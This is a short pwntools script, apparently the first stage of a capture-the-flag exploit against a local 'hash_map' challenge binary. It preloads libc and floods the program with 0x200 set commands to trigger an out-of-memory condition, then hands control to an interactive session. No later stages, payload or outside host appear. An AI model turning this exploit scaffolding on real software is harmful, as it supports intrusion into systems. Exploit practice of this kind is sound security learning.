from pwn import *
context.log_level = 'info'

elf = ELF('./bin/hash_map')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = elf.process(env={'LD_PRELOAD': libc.path})

def send(data):
    p.recvuntil('Command > '.encode())
    p.sendline(data.encode())
    return p.recvline()[9:-1].decode()


######################################
### Stage 1: Trigger Out-of-Memory ###
######################################

send('create hash_map')
send('hash_map set 0 0')

# Trigger OOM
for i in range(1, 0x200):
    send(f'hash_map set {i} {i}')

p.interactive()
p.close()
